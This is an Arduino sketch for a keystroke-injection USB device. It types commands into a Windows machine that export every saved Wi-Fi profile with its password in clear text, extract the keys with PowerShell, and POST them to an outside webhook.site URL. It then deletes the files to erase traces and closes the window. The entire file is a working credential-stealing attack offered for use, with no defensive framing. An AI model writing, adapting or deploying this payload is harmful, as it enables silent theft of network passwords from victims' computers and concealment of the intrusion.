#include <Keyboard.h>

void setup() {
  // Initialize the Keyboard library
  Keyboard.begin();

  // Give some time for the computer to recognize the Arduino
  delay(1000); 
  
  // Open the Run dialog (Windows key + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  // Type the command "cmd" and press enter
  Keyboard.print("cmd");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  ///////////////////////////////////

  //Moving to temporary dir
  Keyboard.print("cd %temp%");
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("netsh wlan export profile key=clear");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  
  Keyboard.releaseAll();
  delay(500);
  //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  Keyboard.print("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  //Sending all passwords to the hook
  Keyboard.print("powershell Invoke-WebRequest -Uri https://webhook.site/db0742ef-434e-4667-8fa9-04910918fbf2 -Method POST -InFile Wi-Fi-PASS");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  //Erasing our trace
  Keyboard.print("del Wi-* /s /f /q");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  // Close the Window 
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(500);
  Keyboard.releaseAll();
}

void loop() {
  // put your main code here, to run repeatedly:

}
